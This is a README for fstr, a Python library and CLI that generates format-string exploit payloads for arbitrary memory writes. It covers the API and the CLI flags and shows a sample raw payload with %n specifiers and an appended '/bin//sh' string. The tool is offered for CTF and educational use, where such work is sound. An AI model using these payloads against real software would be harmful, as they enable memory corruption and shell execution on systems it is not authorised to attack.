# fstr: Automatic format string payloads
fstr is a powerful, lightweight tool which instantly generates payloads for arbitrary writes using format string vulnerabilities. Unlike other automated payload generators, fstr writes all addresses to the end of the payload instead of the beginning to make sure that the vulnerable printf acutally reaches all the format specifiers.
![demo](images/demo.png)

# Installation
Create a virtual environment if you haven't already:
```
python3 -m venv .venv
. .venv/bin/activate
```
Then install:
```
git clone https://github.com/TheKrizzler/fstr.git
pip3 install ./fstr
```
# Usage
This tool is primarily meant as a python library, but it also has a CLI. For the generated payload to function properly, the following requirements must be met.  
 - Your input must be stored on the stack, and must be findable using a format specifier leak. The offset at which your input is found using this leak, corresponds to the keyword argument 'offset'.  
 - You must not prepend anything to the payload, unless you know what you're doing.  
 - If you want to include another format specifier (to leak an address for example), you must do modify the payload carefully, by changing the padding and offsets manually if necessary.
## Python
To start off, create either a `FormatString64` or `FormatString32` object with the following arguments: writes, offset, append.  
  
Simply use the `.craft()` method to create the payload. This method will return the payload as a bytestring, so it can be saved and used later.
```python
from fstr import FormatString64

addr = 0x7fffffffdc00
data = 0x4011ae

fmtstr = FormatString64(writes={addr:data},offset=6,append='/bin/sh\0')
payload = fmtstr.craft()
```
`write`: Takes a dictionary containing all desired writes.  
`offset`: An integer representing the offset at which your own input can be found using a format string vulnerablity. **The payload will not work if the offset is incorrect**   
`max_write`: Takes an int for maximum number of bytes each %x format specifier can write. Reduces total bytes output by the printf, but increases payload length.  
`append`: A string to append to the payload. Does the exact same thing as appending text manually.  

## CLI
Run the following command to see the help menu.
```
$ fstr -h
usage: fstr [-h] -w WRITE --arch {32,64} [-o OFFSET] [-m MAX] [-a APPEND] [-r]

options:
  -h, --help            show this help message and exit
  -w WRITE, --write WRITE
                        REQUIRED - Specify a single address:data pair
                        in hex, i.e 0x404000:0x1337. Can be used multiple
                        times.
  --arch {32,64}        REQUIRED - Specify either 32-bit or 64-bit
                        architecture
  -o OFFSET, --offset OFFSET
                        Specify the offset at which your input is found using
                        a format string vulnerability
  -m MAX, --max MAX     Specify a maximum amount of bytes each format
                        specifier can write. (use this if the payload is
                        crashing your terminal)
  -a APPEND, --append APPEND
                        Specify a string to append to the payload
  -r, --raw             Outputs the only final payload as raw bytes.
```
Example use:
```
$ fstr --arch 64 -w 0x404000:0x1337 -o 6 -a '/bin//sh'
  __       _         
 / _|     | |        
| |_  ___ | |_  _ __ 
|  _|/ __|| __|| '__|
| |  \__ \| |_ | |   
|_|  |___/ \__||_|   
by @TheKrizzler
[*] b'%9$hn%10$n%4919x%11$hn..\x02@@\x00\x00\x00\x00\x00\x04@@\x00\x00\x00\x00\x00\x00@@\x00\x00\x00\x00\x00/bin//sh'
[*] Length: 56

```
# Disclaimer
fstr is a tool designed exclusively for use in Capture The Flag (CTF) competitions and educational purposes. It is not intended for any illegal or malicious activities. The creators and distributors of fstr do not condone or support the use of this tool for unauthorized access or any activities that violate applicable laws and regulations. Users are responsible for ensuring that their use of fstr complies with all relevant legal requirements.
